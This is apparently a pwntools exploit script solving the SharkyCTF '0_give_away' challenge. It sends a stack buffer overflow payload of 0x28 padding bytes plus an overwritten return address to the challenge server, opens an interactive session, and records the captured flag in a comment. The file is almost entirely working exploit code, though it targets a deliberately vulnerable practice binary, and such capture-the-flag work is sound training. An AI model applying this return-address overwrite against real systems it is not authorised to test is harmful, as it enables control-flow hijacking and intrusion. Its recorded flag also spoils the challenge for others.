from pwn import *


binpath = './0_give_away'


elf = ELF(binpath)
libc = elf.libc

context.terminal = ['tmux', 'split-w', '-h']
context.binary = elf


gdbscript = '''
gef
b *0x4006C4
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('sharkyctf.xyz', 20333)


payload = b''
payload = b'A' * 0x28
payload += p64(0x4006A7)

io.sendline(payload)

io.interactive()


# shkCTF{#Fr33_fL4g!!_<3}
